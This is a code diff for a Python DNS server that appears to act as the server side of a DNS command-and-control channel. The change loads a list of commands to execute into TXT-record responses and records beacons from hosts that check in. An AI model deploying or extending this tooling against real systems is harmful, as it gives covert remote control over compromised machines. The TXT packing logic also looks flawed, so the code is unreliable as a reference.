@@ -14,11 +14,11 @@ class DNSResponse:
         addr - the address to send the packet too.
         txt - boolean value whether it's a txt record or not        
     """
-    def __init__(self, addr, txt):
+    def __init__(self, addr, txt, commands):
         self.addr = addr
         self.packet = None
         self.txt = txt
-        self.cmd = None     # command to execute
+        self.commands = commands     # commands to execute
 
     """
         Packs data into a binary struct to send as a
@@ -37,8 +37,7 @@ class DNSResponse:
         tmp_url = url.split(".")
         for x in tmp_url:
             self.packet += struct.pack("B", len(x)) # Store length of name
-            for byte in bytes(x):
-                self.packet += struct.pack("c", byte) # Store each char
+            self.packet += ''.join(struct.pack("c", byte) for byte in bytes(x)) # Loop & store name
         self.packet += struct.pack("B", 0) # Terminate name
         if self.txt:
             self.packet += struct.pack("!H", 16) # Q TXT Type
@@ -65,10 +64,12 @@ class DNSResponse:
         self.packet += struct.pack("!H", 1) # Class 2 bytes
         self.packet += struct.pack("!I", 1) # TTL 4 bytes
         if self.txt:    # load command
-            self.cmd = "echo we in here"
-            self.packet += struct.pack("!H", len(self.cmd) + 1) # RDLENGTH
-            self.packet += struct.pack("B", len(self.cmd)) # TXT Length(cmd length)
-            self.packet += ''.join(struct.pack("c", x) for x in self.cmd) # loop & store command
+            length = sum(len(cmd) for cmd in self.commands) # summation of each cmd length
+            self.packet += struct.pack("!H", length + 1) # RDLENGTH(cmd length) + txt length field
+            self.packet += struct.pack("B", length) # TXT Length(cmd lengths)
+            for cmd in self.commands:
+                print cmd
+                self.packet += ''.join(struct.pack("c", x) for x in cmd) # loop & store command
         else:   # load IP for A record
             self.packet += struct.pack("!H", 4) # RDLENGTH 2 bytes
             self.packet += struct.pack("!I", 2165670612)  # RDATA, should be IP address from A record
@@ -84,7 +85,9 @@ class DNSResponse:
 """
 def send_response(addr, server, dnsQuery, txt):
     print "Sending response"
-    response = DNSResponse(addr, txt)
-    response.create_packet("doshcloud.com", dnsQuery.qID)
+    response = DNSResponse(addr, txt, server.commands)
+    response.create_packet(dnsQuery.fullNames[0], dnsQuery.qID)
     server.sock.sendto(bytes(response.packet), addr)
+    if dnsQuery.checkin:
+        server.add_beacon(addr)
     print "Response sent"
